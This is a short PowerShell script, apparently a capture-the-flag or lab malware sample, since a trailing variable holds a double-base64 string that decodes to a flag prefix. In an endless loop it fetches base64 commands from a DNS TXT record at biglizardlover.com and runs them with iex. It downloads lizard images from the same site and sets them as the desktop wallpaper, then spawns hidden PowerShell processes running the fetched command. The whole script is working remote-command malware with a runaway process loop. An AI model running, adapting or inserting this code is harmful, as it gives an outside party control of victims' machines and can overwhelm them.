while ($true) {
    $glideelbow = iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName VFdWbllVSnZibXM9.biglizardlover.com -Type txt | Select-Object -ExpandProperty Strings))))
    $twilightdepend = Join-Path $env:TEMP "lizard.jpg"
    $biscuitrecognize = Get-Random -Minimum 1 -Maximum 25
    $galaxyfeastparty = "https://biglizardlover.com/img/lizard$biscuitrecognize.jpg"
    Invoke-WebRequest $galaxyfeastparty -OutFile $twilightdepend -ErrorAction SilentlyContinue | Out-Null
    Add-Type -TypeDefinition "using System; using System.Runtime.InteropServices; public class W { [DllImport(`"user32.dll`")] public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni); }"; [W]::SystemParametersInfo(20,0,$twilightdepend,1+2) | Out-Null
    Start-Process powershell -ArgumentList '-Command', $glideelbow -WindowStyle Hidden
}
$objectTest = "Wm14aFozczNOak0wTWpZNVlXVmhPRGs9"